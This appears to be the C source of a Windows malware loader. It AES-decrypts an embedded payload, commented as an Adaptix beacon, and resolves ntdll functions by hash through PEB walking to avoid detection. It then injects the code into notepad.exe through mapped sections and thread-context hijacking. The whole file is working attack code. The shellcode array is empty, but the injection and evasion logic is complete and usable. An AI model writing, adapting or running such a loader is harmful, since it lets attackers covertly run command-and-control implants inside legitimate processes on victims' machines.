#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <winternl.h>
#include <string.h>
#include <Psapi.h>
#include <bcrypt.h>

#define KEY_LEN 32
#define IV_LEN  16

const BYTE aes_key[32] = {
    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
    0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,
    0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,
    0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,0x20
};

const BYTE aes_iv[16] = {
    0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,
    0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,0x30
};


const BYTE shellcode_enc[] = {
    //Adaptix beacon shellcode
};


const DWORD se_len = sizeof(shellcode_enc);
//unsigned int agent_x64_bin_len = 95743;
//const SIZE_T shellcode_len = sizeof(shellcode);



#define Kernel32dll_hash 2666974377
#define uaw_wcslen_hash  4252404561

#define ntdll_hash 1273438369
#define NtCreateSection_Hash 4170957444
#define NtMApViewOfSection_Hash 1763167902

#define INI_HASH 1337
int DBJ2(PCHAR TargetString){
    ULONG HASH = INI_HASH;
    int C;

    while((C = *TargetString++)){
        HASH = ((HASH << 5) + HASH) + C;
    }
    return HASH;
}

BOOL aes_decrypt(
    const BYTE *_shellcode_enc_,
    DWORD se_len,
    const BYTE *_key_,
    DWORD key_len,
    BYTE *_iv_,
    BYTE *_pt_,
    DWORD *_pt_len_)
{
    BCRYPT_ALG_HANDLE HandleToAlg = NULL;
    BCRYPT_KEY_HANDLE HandleToKey = NULL;
    NTSTATUS s;
    ULONG out_len = 0;
    BOOL success = FALSE;

    if (!_shellcode_enc_ || !_key_ || !_iv_ ||
        !_pt_ || !_pt_len_ || key_len != KEY_LEN ||
        se_len == 0 || se_len % IV_LEN != 0)
        return FALSE;

    *_pt_len_ = 0;

    s = BCryptOpenAlgorithmProvider(
        &HandleToAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(s))
        goto cleanup;

    s = BCryptSetProperty(
        HandleToAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0);
    if (!BCRYPT_SUCCESS(s))
        goto cleanup;

    s = BCryptGenerateSymmetricKey(
        HandleToAlg,
        &HandleToKey,
        NULL,
        0,
        (PUCHAR)_key_,
        key_len,
        0);
    if (!BCRYPT_SUCCESS(s))
        goto cleanup;

    BYTE iv_copy[IV_LEN];
    memcpy(iv_copy, _iv_, IV_LEN);

    s = BCryptDecrypt(
        HandleToKey,
        (PUCHAR)_shellcode_enc_,
        se_len,
        NULL,
        iv_copy,
        IV_LEN,
        _pt_,
        se_len,
        &out_len,
        BCRYPT_BLOCK_PADDING);

    if (!BCRYPT_SUCCESS(s))
        goto cleanup;

    *_pt_len_ = out_len;
    success = TRUE;

cleanup:
    if (HandleToKey)
        BCryptDestroyKey(HandleToKey);

    if (HandleToAlg)
        BCryptCloseAlgorithmProvider(HandleToAlg, 0);

    return success;
}

FARPROC GetProcAddReplacement(HMODULE HModule, DWORD TargetAPIHash){
    PBYTE PBase = (PBYTE)HModule;

    PIMAGE_DOS_HEADER PImageDosHeaders = (PIMAGE_DOS_HEADER)PBase;
    if(PImageDosHeaders->e_magic != IMAGE_DOS_SIGNATURE){
        return NULL;
    }
    
    PIMAGE_NT_HEADERS PImageNtHeaders = (PIMAGE_NT_HEADERS)(PBase + PImageDosHeaders->e_lfanew);
    if(PImageNtHeaders -> Signature != IMAGE_NT_SIGNATURE){
        return NULL;
    }
    
    IMAGE_OPTIONAL_HEADER ImgOptHeaders = PImageNtHeaders->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY PImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(PBase + ImgOptHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray 	= (PDWORD)(PBase + PImageExportDirectory->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(PBase + PImageExportDirectory->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(PBase + PImageExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < PImageExportDirectory->NumberOfNames; i++){
	    CHAR* pFunctionName		= (CHAR*)(PBase + FunctionNameArray[i]);
        WORD wFunctionOrdinal = FunctionOrdinalArray[i];
        PVOID pFunctionAddress = (PVOID)(PBase + FunctionAddressArray[wFunctionOrdinal]);
	    
        int hashedFunc = DBJ2(pFunctionName);
	    if(hashedFunc == TargetAPIHash){
            return (FARPROC)pFunctionAddress;
        }
        
    }
    return NULL;
}

LPCWSTR GetFileNameFromPath(LPCWSTR FullPath){
    LPCWSTR LastSlash = wcsrchr(FullPath, L'\\');
    if(LastSlash != NULL){
        return LastSlash+1;
    }
    return FullPath;
}

HMODULE GetModuleHandleCustom(DWORD TargetModuleHash){
    PPEB pPebvar = (PEB*)(__readgsqword(0x60));
    PPEB_LDR_DATA pLDR = (PPEB_LDR_DATA)(pPebvar->Ldr);
    PLIST_ENTRY PListHead = &(pLDR->InMemoryOrderModuleList);

    PLIST_ENTRY PCurrent = PListHead->Flink;
    while(PCurrent != PListHead){

        PLDR_DATA_TABLE_ENTRY pDTE = CONTAINING_RECORD(
            PCurrent,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );



        if(pDTE->FullDllName.Length > 0 && pDTE->FullDllName.Buffer != 0){
            USHORT cch = pDTE->FullDllName.Length/sizeof(WCHAR);

            PWCHAR ModulePath = (PWCHAR)malloc((cch+1)*sizeof(WCHAR));
            
            if(ModulePath == NULL){
                PCurrent = PCurrent->Flink;
                continue;
            }
            
            wcsncpy(ModulePath, pDTE->FullDllName.Buffer, cch);
            ModulePath[cch] = L'\0';
            CharLowerW(ModulePath);
            LPCWSTR ModuleFileName = GetFileNameFromPath(ModulePath);

            char ModuleNameA[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, ModuleFileName, -1, ModuleNameA, MAX_PATH, NULL, NULL);
            DWORD HashedModule = DBJ2(ModuleNameA);
            if(TargetModuleHash == HashedModule){
                free(ModulePath);
                return (HMODULE)(pDTE->DllBase);
            }
            free(ModulePath);
        }
        PCurrent = PCurrent->Flink;
    }
    return NULL;
}


typedef NTSTATUS(NTAPI *NtCreateSection_t)(
    /* OUT */ PHANDLE SectionHandle,
    /* IN */ ACCESS_MASK DesiredAccess,
    /* IN, optional */ PVOID ObjectAttributes,
    /* IN, optional */ PLARGE_INTEGER MaximumSize,
    /* IN */ ULONG SectionPageProtections,
    /* IN */ ULONG AllocationAttributes,
    /* IN, optional */ HANDLE FileHandle
);

typedef NTSTATUS(NTAPI *NtMapViewOfSection_t)(
    /* IN */ HANDLE SectionHandle,
    /* IN */ HANDLE ProcessHandle,
    /* IN, OUT */ PVOID *BaseAddress,
    /* IN */ ULONG_PTR ZeroBits,
    /* IN */ SIZE_T CommitSize,
    /* in, out, optional */ PLARGE_INTEGER SectionOffset,
    /* IN, OUT */ PSIZE_T ViewSize,
    /* IN */ DWORD InheritDisposition,
    /* IN */ ULONG AllocationType,
    /* IN */ ULONG PageProtection
);

DWORD FindPID(const char* target){
    HANDLE HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe)};
    DWORD pid;
    if(Process32First(HSnapshot, &pe)){
        do{
            if(_stricmp(pe.szExeFile, target) == 0){
                pid = pe.th32ProcessID;
                break;
            }
        }while(Process32Next(HSnapshot, &pe));
    }
    CloseHandle(HSnapshot);
    return pid;
}

DWORD findTID(DWORD pid){
    HANDLE HSnapshotT = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD tid = 0;
    THREADENTRY32 te = { .dwSize = sizeof(te)};
    if(Thread32First(HSnapshotT, &te)){
        do{
            if(te.th32OwnerProcessID == pid){
                tid = te.th32ThreadID;
                break;
            }
        }while(Thread32Next(HSnapshotT, &te));
    }
    CloseHandle(HSnapshotT);
    return tid;
}

int main(){

    BYTE iv_copy[16];
    memcpy(iv_copy, aes_iv, 16);
    BYTE *pt = VirtualAlloc(NULL, se_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    DWORD pt_len = 0;
    if(!aes_decrypt(shellcode_enc, se_len, aes_key, 32, iv_copy, pt, &pt_len)){
        printf("decrypt failed\n");
        return 1;
    }
    DWORD old;
    VirtualProtect(pt, pt_len, PAGE_EXECUTE_READ, &old);


    const char TargetProcess[]= "notepad.exe";
    DWORD TargetPID = FindPID(TargetProcess);
    DWORD TargetTID = findTID(TargetPID);
    PVOID LocalMapping = NULL;
    PVOID RemoteMapping = NULL;
    HANDLE HSection;
    // SIZE_T size = 4096;
    // LARGE_INTEGER SecSize ={size};

    SIZE_T size = (SIZE_T)pt_len;
    size = (size + 0xFFF) & ~(SIZE_T)0xFFF;

    LARGE_INTEGER SecSize;
    SecSize.QuadPart = (LONGLONG)size;

    SIZE_T viewSizeLocal = size, viewSizeRemote = size;


    HANDLE HandleToTargetProc = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|SYNCHRONIZE|PROCESS_QUERY_INFORMATION, FALSE, TargetPID);
    HMODULE nt = GetModuleHandleCustom(ntdll_hash);
    NtCreateSection_t PointerToNtCS = (NtCreateSection_t)GetProcAddReplacement(nt, 4170957444);
    NtMapViewOfSection_t PointerToNtMVS = (NtMapViewOfSection_t)GetProcAddReplacement(nt, 1763167902);

    if(PointerToNtCS(&HSection, SECTION_MAP_EXECUTE|SECTION_MAP_READ|SECTION_MAP_WRITE, NULL, (PLARGE_INTEGER)&SecSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)){
        printf("NtCS Failed");
        return -1;
    }

    if(PointerToNtMVS(HSection, GetCurrentProcess(), &LocalMapping, 0, 0, NULL, &size, 2, 0, PAGE_READWRITE)){
        printf("Local NtMVS failed");
        return -1;
    }
    memcpy(LocalMapping, pt, pt_len);

    if(PointerToNtMVS(HSection, HandleToTargetProc, &RemoteMapping, 0, 0, NULL, &size, 1, 0, PAGE_EXECUTE_READ)){
        printf("Remote NtMVS failed");
        return -1;
    }

    HANDLE TargetThreadHandle = OpenThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, FALSE, TargetTID);
    SuspendThread(TargetThreadHandle);
    CONTEXT ThreadCTX = {.ContextFlags = CONTEXT_CONTROL};

    if(!GetThreadContext(TargetThreadHandle, &ThreadCTX)){
        printf("GetThreadContext Failed");
        return -1;
    }
    ThreadCTX.Rip = (DWORD64)RemoteMapping;

    if(!SetThreadContext(TargetThreadHandle, &ThreadCTX)){
        printf("SetThreadContext Failed");
        return -1;
    }
    ResumeThread(TargetThreadHandle);

    CloseHandle(HSection);
    CloseHandle(HandleToTargetProc);

    return 0;
}